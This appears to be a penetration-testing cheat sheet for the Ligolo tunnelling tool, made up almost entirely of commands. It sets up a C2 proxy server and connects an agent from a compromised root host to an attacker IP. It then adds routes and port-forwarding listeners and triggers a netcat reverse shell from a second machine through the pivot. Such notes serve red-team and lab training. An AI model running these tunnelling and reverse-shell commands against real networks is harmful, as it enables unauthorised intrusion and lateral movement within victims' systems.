Create a TUN interface on the C2 (proxy) server
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
Start proxy server
```shell
./proxy -h # Help options
./proxy -autocert # Automatically request LetsEncrypt certificates
./proxy -selfcert # Use self-signed certificates
```
Connect to proxy server
```
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```
Start Tunnel (Select session first)
```
[Agent : root@prod-serv] Â» session
? Specify a session :  [Use arrows to move, type to filter]
> 1 - #1 - root@prod-serv - 10.200.96.200:46478
start
```
Add networking route on ATTACKER machine
```
sudo ip route add <IP>/<CIDR> dev ligolo
```
Add listener
```
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```
- `0.0.0.0` binding listening address
- `127.0.0.1` attacker machine
- Machine A (Compromised machine)
On Machine B  trigger a reverse shell
```
nc -e <MACHINE A IP> <PORT>
nc -e <MACHINE A IP> 30000
```
All traffic to 30000 will be redirected to port 10000 on the attacker machine

Local Port Forwarding
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
Reset/Restart setup
```
sudo ip link delete ligolo
```